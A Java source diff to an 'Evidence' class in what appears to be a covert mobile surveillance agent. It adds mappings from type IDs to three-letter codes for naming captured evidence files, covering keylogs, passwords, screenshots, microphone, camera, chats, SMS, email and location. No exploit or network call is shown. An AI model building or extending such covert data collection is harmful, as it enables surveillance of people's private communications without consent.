@@ -89,6 +89,16 @@ public final class Evidence {
             EvidenceType.NONE // 12
     };
 
+    public static final String[] MEMO_TYPE_EVIDENCE = new String[] { "INF",
+            "MAR", "ADD", "CLL", // 0..3
+            "DEV", "LOC", "CAL", "CLM", // 4..7
+            "KEY", "SNP", "URL", "CHA", // 8..b
+            "MAI", "MIC", "CAM", "CLI", // c..f
+            "NON", "APP", // 10..11
+            "NON" // 12
+
+    };
+
     private static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
     //#ifdef DEBUG
@@ -121,6 +131,85 @@ public final class Evidence {
         debug.warn("Wrong agentId conversion: " + agentId);
         //#endif
         return EvidenceType.UNKNOWN;
+    }
+
+    public static String memoTypeEvidence(final int typeId) {
+        switch (typeId) {
+            case 0xFFFF:
+                return "NON";
+            case 0x0000:
+                return "FON";
+            case 0x0001:
+                return "FCA";
+            case 0x0040:
+                return "KEY";
+            case 0x0100:
+                return "PRN";
+            case 0xB9B9:
+                return "SNP";
+            case 0xD1D1:
+                return "UPL";
+            case 0xD0D0:
+                return "DOW";
+            case 0x0140:
+                return "CAL";
+            case 0x0141:
+                return "SKY";
+            case 0x0142:
+                return "GTA";
+            case 0x0143:
+                return "YMS";
+            case 0x0144:
+                return "MSN";
+            case 0x0145:
+                return "MOB";
+            case 0x0180:
+                return "URL";
+            case 0xD9D9:
+                return "CLP";
+            case 0xFAFA:
+                return "PWD";
+            case 0xC2C2:
+                return "MIC";
+            case 0xC6C6:
+                return "CHA";
+            case 0xE9E9:
+                return "CAM";
+            case 0x0200:
+                return "ADD";
+            case 0x0201:
+                return "CAL";
+            case 0x0202:
+                return "TSK";
+            case 0x0210:
+                return "MAI";
+            case 0x0211:
+                return "SMS";
+            case 0x0212:
+                return "MMS";
+            case 0x0220:
+                return "LOC";
+            case 0x0230:
+                return "CAL";
+            case 0x0240:
+                return "DEV";
+            case 0x0241:
+                return "INF";
+            case 0x1011:
+                return "APP";
+            case 0x0300:
+                return "SKI";
+            case 0x1001:
+                return "MAI";
+            case 0x0213:
+                return "SMS";
+            case 0x1220:
+                return "LOC";
+            case 0xEDA1:
+                return "FSS";
+
+        }
+        return "UNK";
     }
 
     Date timestamp;
@@ -285,7 +374,8 @@ public final class Evidence {
             return false;
         }
 
-        final Vector tuple = evidenceCollector.makeNewName(this, logType, onSD);
+        final Vector tuple = evidenceCollector.makeNewName(this,
+                memoTypeEvidence(logType), onSD);
         //#ifdef DBC
         Check.asserts(tuple.size() == 5, "Wrong tuple size");
         //#endif
@@ -594,7 +684,8 @@ public final class Evidence {
         }
     }
 
-    public synchronized void atomicWriteOnce(byte[] additionalData, byte[] content) {
+    public synchronized void atomicWriteOnce(byte[] additionalData,
+            byte[] content) {
         createEvidence(additionalData);
         writeEvidence(content);
         close();
